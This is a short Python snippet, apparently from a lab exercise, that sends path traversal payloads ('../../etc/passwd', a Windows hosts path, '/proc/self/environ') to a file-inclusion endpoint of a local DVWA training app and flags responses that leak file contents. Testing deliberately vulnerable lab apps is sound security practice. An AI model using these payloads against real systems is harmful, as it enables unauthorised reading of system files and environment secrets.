# Step 1: Discover endpoints
endpoints = ["http://localhost/DVWA/vulnerabilities/fi/?page="]

# Step 2: Craft payloads
payloads = [
    "../../etc/passwd",  # Linux sensitive file
    "../../windows/system32/drivers/etc/hosts",  # Windows hosts file
    "/proc/self/environ"  # Process environment variables
]

# Step 3: Test each endpoint with payloads
for endpoint in endpoints:
    for payload in payloads:
        url = f"{endpoint}{payload}"
        response = requests.get(url)
        if "root:" in response.text or "127.0.0.1" in response.text:
            print(f"Vulnerability found at: {url}")